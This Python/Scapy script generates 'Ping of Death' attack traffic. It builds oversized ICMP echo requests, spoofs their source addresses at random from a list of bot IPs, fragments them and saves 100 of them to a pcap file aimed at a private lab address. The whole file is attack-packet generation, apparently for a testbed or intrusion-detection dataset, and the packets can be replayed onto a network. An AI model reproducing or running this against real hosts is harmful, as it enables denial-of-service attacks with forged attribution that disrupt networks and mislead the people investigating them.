from scapy.all import *
import random
import time
import ipaddress

# ICMP Ping of Death
TARGET_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 100
PAYLOAD_SIZE = 65600

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_POD():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0


    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        icmp_layer = ICMP(type=8, code=0) / os.urandom(PAYLOAD_SIZE)  # Echo Request PAYLOAD 2^16
        pkt = ip_layer / icmp_layer

        # Frag
        frags = fragment(pkt, fragsize=1480)

        for frag in frags:
            lista_de_pacotes.append(eth_layer / frag)

        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == NUM_PACKETS:
            break


    start_time = time.perf_counter()
    wrpcap("icmp_POD.pcap", lista_de_pacotes)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nPCAP file saved.")
    print(f"Total time to save packets: {duration:.4f} seconds")


if __name__ == "__main__":
    run_icmp_POD()

# Comando: sudo PYTHONPATH=$HOME/scapy python3 icmp_POD.py